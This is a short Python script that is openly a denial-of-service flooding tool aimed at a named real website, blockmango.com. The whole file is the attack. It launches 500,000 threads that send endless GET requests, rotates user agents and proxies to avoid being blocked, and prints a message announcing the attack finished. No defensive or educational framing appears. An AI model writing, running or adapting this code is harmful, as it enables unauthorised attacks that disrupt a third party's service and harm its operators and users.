import threading
import requests
import time
import random
import queue

# Target URL to DDoS
target_url = "https://www.blockmango.com"

# Number of threads to use
num_threads = 500000  # Increased to 500,000 threads

# List of user agents to randomize
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
]

# List of proxies to rotate
proxies = [
    "http://proxy1.example.com:8080",
    "http://proxy2.example.com:8080",
    "http://proxy3.example.com:8080",
    "http://proxy4.example.com:8080",
    "http://proxy5.example.com:8080"
]

# Queue to hold requests
request_queue = queue.Queue()

# Function to send HTTP requests
def ddos():
    while True:
        try:
            proxy = random.choice(proxies)
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy})
            print(f"Sent request to {target_url} via {proxy}. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

# Create and start threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=ddos)
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("DDoS attack finished.")